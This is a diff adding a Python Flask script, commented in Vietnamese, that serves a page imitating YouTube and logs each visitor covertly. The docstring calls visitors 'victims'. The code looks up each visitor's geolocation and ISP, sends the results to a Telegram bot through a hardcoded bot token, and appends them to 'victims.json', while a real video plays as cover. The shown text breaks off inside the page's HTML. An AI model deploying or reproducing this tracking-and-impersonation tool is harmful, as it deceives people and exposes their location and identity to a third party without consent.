@@ -1,0 +1,227 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+FAKE YOUTUBE PAGE + IP LOGGER
+Nạn nhân click link → thấy video thật → IP bị log
+"""
+
+from flask import Flask, request, render_template_string
+import requests
+from datetime import datetime
+import json
+import os
+
+app = Flask(__name__)
+
+# ========== CONFIG ==========
+TELEGRAM_TOKEN = os.environ.get('TELEGRAM_TOKEN', '8691955774:AAHqYfpwCRY1w72HgsEZFn0HipXj6F_1zag')
+TELEGRAM_CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', 'iplogger_HaiNguyen_bot')
+YOUTUBE_VIDEO_ID = os.environ.get('YOUTUBE_VIDEO_ID', 'dQw4w9WgXcQ')
+# ============================
+
+def get_location(ip):
+    try:
+        response = requests.get(
+            f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon,timezone,mobile,proxy,hosting',
+            timeout=5
+        )
+        data = response.json()
+        if data.get('status') == 'success':
+            return data
+    except:
+        pass
+    return None
+
+def send_telegram(message):
+    try:
+        url = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
+        requests.post(url, data={
+            'chat_id': TELEGRAM_CHAT_ID,
+            'text': message,
+            'parse_mode': 'HTML'
+        }, timeout=5)
+    except:
+        pass
+
+def log_to_file(data):
+    try:
+        with open('victims.json', 'a') as f:
+            f.write(json.dumps(data) + '\n')
+    except:
+        pass
+
+# ========== TRANG GIẢ MẠO YOUTUBE ==========
+FAKE_YOUTUBE_PAGE = """
+<!DOCTYPE html>
+<html>
+<head>
+    <title>YouTube</title>
+    <link rel="icon" href="https://www.youtube.com/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: #0f0f0f; 
+            font-family: 'Roboto', Arial, sans-serif;
+            color: white;
+            min-height: 100vh;
+        }
+        .header {
+            background: #0f0f0f;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 1px solid #272727;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .logo img { width: 30px; height: 30px; }
+        .logo span { font-size: 20px; font-weight: bold; }
+        .search-bar {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            flex: 1;
+            max-width: 600px;
+            margin: 0 20px;
+        }
+        .search-bar input {
+            flex: 1;
+            padding: 8px 15px;
+            border-radius: 20px;
+            border: 1px solid #303030;
+            background: #121212;
+            color: white;
+            font-size: 14px;
+            outline: none;
+        }
+        .search-bar button {
+            padding: 8px 15px;
+            border-radius: 20px;
+            border: none;
+            background: #272727;
+            color: white;
+            cursor: pointer;
+        }
+        .video-container {
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 0 20px;
+        }
+        .video-wrapper {
+            position: relative;
+            padding-bottom: 56.25%;
+            height: 0;
+            border-radius: 12px;
+            overflow: hidden;
+            background: #000;
+        }
+        .video-wrapper iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .video-info {
+            margin-top: 15px;
+        }
+        .video-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        .channel-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .channel-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #272727;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #aaa;
+        }
+        .channel-name {
+            font-weight: bold;
+        }
+        .subscribe-btn {
+            background: #cc0000;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-left: auto;
+        }
+        .video-description {
+            background: #272727;
+            padding: 15px;
+            border-radius: 12px;
+            margin-top: 15px;
+            color: #aaa;
+            line-height: 1.5;
+        }
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0f0f0f;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            transition: opacity 0.5s;
+        }
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #272727;
+            border-top: 5px solid #cc0000;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+    </div>
+    
+    <div class="header">
+        <div class="logo">
+            <img src="https://www.youtube.com/favicon.ico" alt="YouTube">
+            <span>YouTube</span>
+        </div>
+        <div class="search-bar">
+            <input type="text" placeholder="Tìm kiếm" value="video hot">
+            <button>🔍</button>
+        </div>
+    </div>
+    
+    <div class="video-container">
+        <div class="video-wrapper">
+            <iframe src="https://www.youtube.com/embed/{{ video_id }}?autoplay=1" 
+                    frameborder="0" 
+                    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture
